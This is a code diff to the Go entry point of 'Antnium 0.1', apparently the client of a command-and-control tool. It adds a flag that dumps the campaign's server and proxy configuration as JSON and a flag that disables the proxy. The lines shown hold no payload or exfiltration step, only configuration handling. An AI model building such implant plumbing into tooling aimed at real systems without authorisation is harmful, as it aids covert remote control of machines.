@@ -1,6 +1,7 @@
 package main
 
 import (
+	"encoding/json"
 	"flag"
 	"fmt"
 	"os"
@@ -11,11 +12,15 @@ import (
 )
 
 func main() {
-	flagServerUrl := flag.String("server", "", "ENV: SERVER")
-	flagProxyUrl := flag.String("proxy", "", "ENV: PROXY")
-	doWingman := flag.Bool("wingman", false, "")
-	proto := flag.String("proto", "", "proto")
-	data := flag.String("data", "", "data")
+	flagServerUrl := flag.String("server", "", "ENV: SERVER") // Upstream
+	flagProxyUrl := flag.String("proxy", "", "ENV: PROXY")    // Upstream
+	doWingman := flag.Bool("wingman", false, "")              // Functionality
+	proto := flag.String("proto", "", "proto")                // Wingman
+	data := flag.String("data", "", "data")                   // Wingman
+
+	dumpData := flag.Bool("dumpData", false, "dumpData")
+	noProxy := flag.Bool("noProxy", false, "noProxy")
+
 	flag.Parse()
 
 	fmt.Println("Antnium 0.1")
@@ -35,6 +40,16 @@ func main() {
 
 	c := client.NewClient()
 
+	if *dumpData {
+		json, err := json.Marshal(c.Campaign)
+		if err != nil {
+			log.Error("Could not JSON marshal")
+			return
+		}
+		fmt.Println(string(json))
+		return
+	}
+
 	if os.Getenv("SERVER") != "" {
 		c.Campaign.ServerUrl = os.Getenv("SERVER")
 	}
@@ -47,6 +62,10 @@ func main() {
 	}
 	if *flagProxyUrl != "" {
 		c.Campaign.ProxyUrl = *flagProxyUrl
+	}
+
+	if *noProxy {
+		c.Campaign.DisableProxy = true
 	}
 
 	c.Start()
